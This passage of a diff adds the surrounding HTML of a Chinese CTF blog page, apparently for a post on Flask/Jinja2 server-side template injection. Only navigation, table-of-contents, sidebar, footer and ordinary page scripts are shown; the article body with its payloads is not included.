+        <div class="nav-label">Next</div>
+        
+        <div class="nav-title">浅析SSRF漏洞 </div>
+        
+      </div>
+      <i class="iconfont icon-right nav-next-icon"></i>
+    </a>
+  </div>
+  
+</div>
+
+<div class="card card-content toc-card" id="mobiletoc">
+  <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python-flask-ssti-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">python-flask-ssti(模版注入漏洞)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">前置知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E4%B8%80%E4%B8%AA%E6%9C%80%E5%B0%8F%E7%9A%84-Flask-%E5%BA%94%E7%94%A8"><span class="toc-text">1.运行一个一个最小的 Flask 应用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-jinja2"><span class="toc-text">2.jinja2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-python%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="toc-text">3.python魔法函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-python%E4%B8%AD%E7%9A%84object"><span class="toc-text">4.python中的object</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">ssti漏洞检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-payload%E5%8E%9F%E7%90%86"><span class="toc-text">1.payload原理</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84payload"><span class="toc-text">常用的payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python2%EF%BC%9A"><span class="toc-text">python2：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python3"><span class="toc-text">python3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-text">WAF绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="toc-text">例题演示</span></a></li></ol>
+</div></main>
+          <aside class="left-column">
+            
+            <div class="card card-author">
+              
+<img src="/img/dog.png" class="author-img">
+
+<p class="author-name">Husins</p>
+<p class="author-description">层楼终究误少年,自由早晚乱余生。</p>
+<div class="author-message">
+  <a class="author-posts-count" href="/archives">
+    <span>37</span>
+    <span>Posts</span>
+  </a>
+  <a class="author-categories-count" href="/categories">
+    <span>2</span>
+    <span>Categories</span>
+  </a>
+  <a class="author-tags-count" href="/tags">
+    <span>6</span>
+    <span>Tags</span>
+  </a>
+</div>
+
+            </div>
+            
+            <div class="sticky-tablet">
+  
+  
+  <article class="display-when-two-columns spacer">
+    <div class="card card-content toc-card">
+      <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python-flask-ssti-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">python-flask-ssti(模版注入漏洞)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">前置知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E4%B8%80%E4%B8%AA%E6%9C%80%E5%B0%8F%E7%9A%84-Flask-%E5%BA%94%E7%94%A8"><span class="toc-text">1.运行一个一个最小的 Flask 应用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-jinja2"><span class="toc-text">2.jinja2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-python%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="toc-text">3.python魔法函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-python%E4%B8%AD%E7%9A%84object"><span class="toc-text">4.python中的object</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">ssti漏洞检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-payload%E5%8E%9F%E7%90%86"><span class="toc-text">1.payload原理</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84payload"><span class="toc-text">常用的payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python2%EF%BC%9A"><span class="toc-text">python2：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python3"><span class="toc-text">python3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-text">WAF绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="toc-text">例题演示</span></a></li></ol>
+    </div>
+  </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header"><i class="iconfont icon-fenlei" style="padding-right: 2px;"></i>Categories</div>
+  <div class="categories-list">
+    
+      <a href="/categories/CTF题解">
+        <div class="categories-list-item">
+          CTF题解
+          <span class="categories-list-item-badge">34</span>
+        </div>
+      </a>
+    
+      <a href="/categories/漏洞总结">
+        <div class="categories-list-item">
+          漏洞总结
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header"><i class="iconfont icon-biaoqian" style="padding-right: 2px;"></i>hot tags</div>
+  <div class="tags-list">
+    
+    <a href="\tags\BUUCTF" title="BUUCTF"><div class="tags-list-item">BUUCTF</div></a>
+    
+    <a href="\tags\攻防世界" title="攻防世界"><div class="tags-list-item">攻防世界</div></a>
+    
+    <a href="\tags\文件包含" title="文件包含"><div class="tags-list-item">文件包含</div></a>
+    
+    <a href="\tags\SSTI" title="SSTI"><div class="tags-list-item">SSTI</div></a>
+    
+    <a href="\tags\SSRF" title="SSRF"><div class="tags-list-item">SSRF</div></a>
+    
+    <a href="\tags\UNCTF" title="UNCTF"><div class="tags-list-item">UNCTF</div></a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+          <aside class="right-column">
+            <div class="sticky-widescreen">
+  
+  
+  <article class="card card-content toc-card">
+    <div class="toc-header"><i class="iconfont icon-menu" style="padding-right: 2px;"></i>TOC</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python-flask-ssti-%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">python-flask-ssti(模版注入漏洞)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-text">前置知识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AA%E4%B8%80%E4%B8%AA%E6%9C%80%E5%B0%8F%E7%9A%84-Flask-%E5%BA%94%E7%94%A8"><span class="toc-text">1.运行一个一个最小的 Flask 应用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-jinja2"><span class="toc-text">2.jinja2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-python%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="toc-text">3.python魔法函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-python%E4%B8%AD%E7%9A%84object"><span class="toc-text">4.python中的object</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">ssti漏洞检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-payload%E5%8E%9F%E7%90%86"><span class="toc-text">1.payload原理</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84payload"><span class="toc-text">常用的payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#python2%EF%BC%9A"><span class="toc-text">python2：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python3"><span class="toc-text">python3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-text">WAF绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="toc-text">例题演示</span></a></li></ol>
+  </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header"><i class="iconfont icon-wenzhang_huaban" style="padding-right: 2px;"></i>Recent Posts</div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-01-27</div>
+        <a href="/FBCTF2019之RCEService/"><div class="recent-posts-item-content">FBCTF2019之RCEService</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-01-27</div>
+        <a href="/GKCTF2020之EZ三剑客-EzWeb/"><div class="recent-posts-item-content">GKCTF2020之EZ三剑客-EzWeb</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-01-27</div>
+        <a href="/MRCTF2020之套娃/"><div class="recent-posts-item-content">MRCTF2020之套娃</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-01-27</div>
+        <a href="/极客大挑战-2019之RCE-ME/"><div class="recent-posts-item-content">极客大挑战 2019之RCE ME</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>Copyright ©
+          
+          2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a href="/" class="footer-link">Husins Blogs </a>
+      </div>
+    </div>
+
+    
+    <div class="footer-dsc">
+      
+      Powered by
+      <a href="https://hexo.io/" class="footer-link" target="_blank" rel="nofollow noopener noreferrer">&nbsp;Hexo </a>
+      
+      
+      <span>&nbsp;|&nbsp;</span>
+      
+      
+      Theme -
+      <a href="https://github.com/theme-kaze" class="footer-link" target="_blank"
+        rel="nofollow noopener noreferrer">&nbsp;Kaze</a>
+      
+    </div>
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+        <span>&nbsp;|&nbsp;</span>
+        
+        
+        本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer>
+  <a role="button" id="scrollbutton" class="basebutton"  aria-label="回到顶部">
+  <i class="iconfont icon-arrowleft button-icon"></i>
+</a>
+<a role="button" id="menubutton" class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a role="button" id="popbutton" class="basebutton" aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a role="button" id="darkbutton" class="basebutton darkwidget" aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a role="button" id="searchbutton" class="basebutton searchwidget" aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a>
+
+  
+  
+  
+  <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img');
+    var i;
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a');
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'));
+      wrapper.setAttribute('aria-label', 'illustration');
+      wrapper.style.cssText = 'width: 100%; display: flex; justify-content: center;';
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt;
+      wrapper.dataset.nolink = true;
+      img[i].before(wrapper);
+      wrapper.append(img[i]);
+      var divWrap = document.createElement('div');
+      divWrap.classList.add('gallery');
+      wrapper.before(divWrap);
+      divWrap.append(wrapper);
+    }
+    baguetteBox.run('.gallery');
+  }
+</script>
+<script>loadScript("/js/lib/lightbox/baguetteBox.min.js", addImgLayout)</script>
+  
+  
+  
+<script src="/js/main.js"></script>
+
+  
+  <script>loadScript("/js/lib/busuanzi.min.js")</script>
+  
+  
+  <script>
+    var addLazyload = function () {
+      var observer = lozad('.lozad', {
+        load: function (el) {
+          el.srcset = el.getAttribute('data-src');
+        },
+        loaded: function (el) {
+          el.classList.add('loaded');
+        }
+      });
+      observer.observe();
+    }
+  </script>
+  <script>loadScript("/js/lib/lozad.min.js", addLazyload)</script>
+  
+  
+</body>
+
+</html>
